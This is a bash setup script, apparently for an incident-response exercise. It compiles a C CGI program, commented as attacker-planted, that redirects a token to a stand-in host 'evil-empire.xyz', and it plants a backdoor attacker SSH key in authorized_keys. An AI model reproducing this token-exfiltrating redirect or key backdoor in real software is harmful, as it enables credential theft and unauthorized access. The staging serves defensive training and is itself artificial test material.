#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip gcc
    pip3 install pytest

    mkdir -p /home/user/incident

    cat << 'EOF' > /home/user/incident/login.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void redirect(char *token) {
    // Malicious open redirect hardcoded by attacker
    char url[256];
    snprintf(url, sizeof(url), "http://evil-empire.xyz/steal?token=%s", token);
    printf("Location: %s\n\n", url);
}

int main() {
    redirect("fake_token_123");
    return 0;
}
EOF
    gcc /home/user/incident/login.c -o /home/user/incident/login.cgi
    rm /home/user/incident/login.c

    cat << 'EOF' > /home/user/incident/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3... user1@legit.com
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCx... dev@legit.com
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... attacker@evil-empire.xyz
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDf... backup@legit.com
EOF

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
